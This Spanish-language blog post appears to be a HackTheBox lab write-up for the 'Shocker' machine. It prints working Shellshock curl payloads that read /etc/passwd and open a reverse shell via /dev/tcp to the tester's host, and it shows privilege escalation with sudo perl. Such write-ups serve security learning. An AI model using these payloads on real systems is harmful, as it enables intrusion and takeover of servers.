---
layout: post
title:  "HackTheBox - Shocker"
author: erik
categories: [ HTB ]
image: https://user-images.githubusercontent.com/47476901/155027926-b71bb485-cab8-42b8-bff8-0a2bcf680799.png
beforetoc: ""
toc: false
tags: [ HTB, CVE, Linux ]
---

Maquina Linux nivel facil

# Table of Contents
1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalación de Privilegios](#escalacion)

---

## Enumeración: <a name="enumeracion"></a>

**Puertos:**
-  80 HTTP
-  2222 SSH

### Nmap

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
```


### Content Web

![WebImage](https://user-images.githubusercontent.com/47476901/123010578-c787b380-d3b6-11eb-8466-9993c71af83a.png)


Haciendo Fuzzing con dirbuster nos encontramos un script en "/cgi-bin/user.sh"

![cgi-bin](https://user-images.githubusercontent.com/47476901/123010587-cbb3d100-d3b6-11eb-8473-e981b30a6ed3.png)

Nos encontramos una vulnerabilidad muy común, que consiste en aprovecharnos del script en /cgi-bin/, conocida como "**shellshock**".
Ya tiene más sentido el texto de la imagen de la web.

Encontré esta página que nos ayuda a explotarla.

- <a href="https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit" target="_blank">Exploit Here</a>

## Explotación: <a name="explotacion"></a>

Utilizamos un payload que nos funcionó:

```bash
curl http://10.10.10.56/cgi-bin/user.sh -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"
```

![TestRCE](https://user-images.githubusercontent.com/47476901/123010602-d2424880-d3b6-11eb-9489-3799f074775e.png)

Dado a que nos funciona el payload , aprovechamos para darnos una shell:

```bash
curl http://10.10.10.56/cgi-bin/user.sh -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/bash -i >& /dev/tcp/10.10.14.12/1234 0>&1" 
```

Y nos ponemos a la escucha:

![RevShell](https://user-images.githubusercontent.com/47476901/123010615-d79f9300-d3b6-11eb-997d-138764b6f72c.png)

## Escalación de privilegios: <a name="escalacion"></a>

En el directorio de shelly nos encontramos la flag de user:

![user txt](https://user-images.githubusercontent.com/47476901/123010625-dc644700-d3b6-11eb-9934-82663b902318.png)

Lo primero que se suele hacer es mirar que binarios podemos ejecutar como root.
Nos encontramos un comando que se puede ejecutar como root y no necesitamos contraseña para ello.

![sudoers](https://user-images.githubusercontent.com/47476901/123010635-dff7ce00-d3b6-11eb-9e0e-7f6c608616e5.png)

Miramos en <a href="https://gtfobins.github.io/" target="_blank">gtfobins</a> como podemos aprovecharnos de el para la escalación.

![gtfobins](https://user-images.githubusercontent.com/47476901/123010639-e38b5500-d3b6-11eb-9874-e34b9a2a6bd9.png)

Procedemos a explotarlo:

```bash
sudo perl -e 'exec "/bin/sh";'
```
![GettingRoot](https://user-images.githubusercontent.com/47476901/123010645-e8500900-d3b6-11eb-95a6-fab08f1b69c6.png)

Ya somos root!

![root txt](https://user-images.githubusercontent.com/47476901/123010650-ec7c2680-d3b6-11eb-8035-5f510a93a872.png)

#### Maquina Completada
